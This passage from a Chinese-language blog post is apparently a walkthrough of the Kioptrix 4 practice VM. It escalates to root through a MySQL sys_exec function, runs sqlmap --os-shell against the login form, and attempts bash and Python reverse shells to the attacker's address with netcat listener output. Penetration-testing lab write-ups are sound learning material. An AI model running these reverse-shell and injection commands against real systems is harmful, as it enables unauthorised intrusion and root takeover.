&apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">ERROR 1125 (HY000): Function &apos;sys_exec&apos; already exists</span><br></pre></td></tr></table></figure>

<p>发现已经存在<code>sys_exec</code>函数，直接利用，将当前用户加到管理组里</p>
<p>老版本linux例外</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You can create a new user simply using the adduser(8) command.</span><br><span class="line"></span><br><span class="line">To make it a user capable of performing sudo, add him to the sudo group using either of the following commands:</span><br><span class="line"></span><br><span class="line">sudo usermod -a -G sudo &lt;username&gt;</span><br><span class="line">sudo adduser &lt;username&gt; sudo</span><br><span class="line">This works because the sudo group is predefined in /etc/sudoers. Note though that older versions of Ubuntu will use admin as group instead:</span><br><span class="line"></span><br><span class="line">Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu 12.04 LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group members are still recognized as administrators</span><br></pre></td></tr></table></figure>

<p>执行提权命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_exec(&apos;usermod -a -G admin john&apos;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(&apos;usermod -a -G admin john&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ sudo -s</span><br><span class="line">[sudo] password for john: </span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is in place so you  don&apos;t screw up</span><br><span class="line">Type &apos;?&apos; or &apos;help&apos; to get the list of allowed commands</span><br><span class="line">root:~$ id</span><br><span class="line">*** unknown command: id</span><br><span class="line">root:~$ </span><br><span class="line">root:~$ quit</span><br><span class="line">john@Kioptrix4:~$ sudo su</span><br><span class="line">root@Kioptrix4:/home/john# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<ul>
<li>另一种思路</li>
</ul>
<p>登陆页面存在sql注入，就可以利用sqlmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.214.143/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot;</span><br><span class="line">-p mypassword --os-shell</span><br></pre></td></tr></table></figure>

<p>这样就获取到一个webshell，也可以继续反弹shell</p>
<p>在这里遇到了问题，一直反弹shell不成功，自己写个一句话木马也不成功</p>
<p>在ssh登陆后的真实shell试，竟然也不成功，发现是系统的问题，没有<code>/dev/tcp</code>这个文件。。。不过python可以用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Kioptrix4:/dev# bash -i &gt;&amp; /dev/tcp/192.168.214.139/7777 0&gt;&amp;1</span><br><span class="line">bash: /dev/tcp/192.168.214.139/7777: No such file or directory</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.214.139&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] y</span><br></pre></td></tr></table></figure>

<p>而一句话写不进去是因为没有权限，sqlmap写的一句话应该是利用mysql的权限写的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.214.143: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.214.139] from (UNKNOWN) [192.168.214.143] 35105</span><br><span class="line">/bin/sh: can&apos;t access tty; job control turned off</span><br><span class="line">$ ls -al</span><br><span class="line">total 76</span><br><span class="line">drwxr-xr-x  5 root root 4096 Oct 24 17:58 .</span><br><span class="line">drwxr-xr-x 14 root root 4096 Feb  4  2012 ..</span><br><span class="line">-rw-r--r--  1 root root 1477 Feb  6  2012 checklogin.php</span><br><span class="line">-rw-r--r--  1 root root  298 Feb  4  2012 database.sql</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb  6  2012 images</span><br><span class="line">-rw-r--r--  1 root root 1255 Feb  6  2012 index.php</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb  4  2012 john</span><br><span class="line">-rw-r--r--  1 root root  176 Feb  4  2012 login_success.php</span><br><span class="line">-rw-r--r--  1 root root   78 Feb  4  2012 logout.php</span><br><span class="line">-rw-r--r--  1 root root  606 Feb  6  2012 member.php</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb  4  2012 robert</span><br><span class="line">-rw-rw-rw-  1 root root  927 Oct 24 17:58 tmpbdges.php</span><br><span class="line">$ touch a.php</span><br><span class="line">touch: cannot touch `a.php&apos;: Permission denied</span><br></pre></td></tr></table></figure>


  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
